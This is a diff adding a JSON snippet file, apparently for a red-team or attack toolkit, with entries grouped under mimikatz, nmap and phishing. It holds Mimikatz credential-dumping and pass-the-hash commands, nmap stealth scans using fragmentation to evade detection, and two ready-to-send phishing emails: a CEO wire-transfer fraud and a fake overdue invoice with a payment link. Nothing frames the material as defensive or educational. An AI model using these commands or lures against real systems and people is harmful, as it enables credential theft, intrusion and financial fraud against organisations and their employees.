@@ -1,0 +1,38 @@
+{
+  "mimikatz": [
+    {
+      "id": "1",
+      "title": "Credential Dump",
+      "content": "sekurlsa::logonpasswords\nlsadump::lsa /inject"
+    },
+    {
+      "id": "2",
+      "title": "Pass-the-Hash",
+      "content": "sekurlsa::pth /user:admin /domain:corp /ntlm:hash"
+    }
+  ],
+  "nmap": [
+    {
+      "id": "1",
+      "title": "Stealth Scan",
+      "content": "nmap -sS -T4 -f -mtu 8 --data-length 100 -oN stealth.log <target>"
+    },
+    {
+      "id": "2",
+      "title": "OS Detection",
+      "content": "nmap -O -f -sV -T4 <target>"
+    }
+  ],
+  "phishing": [
+    {
+      "id": "1",
+      "title": "CEO Fraud",
+      "content": "Subject: URGENT: Wire Transfer Approval Needed\n\nHi [Name],\n\nI'm in a meeting right now and can't talk. I need you to process a wire transfer of $[Amount] to [Bank Details] immediately for an acquisition closing today.\n\nPlease confirm once done.\n\nBest,\n[CEO Name]"
+    },
+    {
+      "id": "2",
+      "title": "Invoice Urgent",
+      "content": "Subject: Invoice #INV-2024-892 Overdue\n\nDear Accounts Payable,\n\nThis is a final notice regarding invoice #INV-2024-892. Please remit payment via the attached link within 24 hours to avoid service suspension.\n\nRegards,\nBilling Dept."
+    }
+  ]
+}
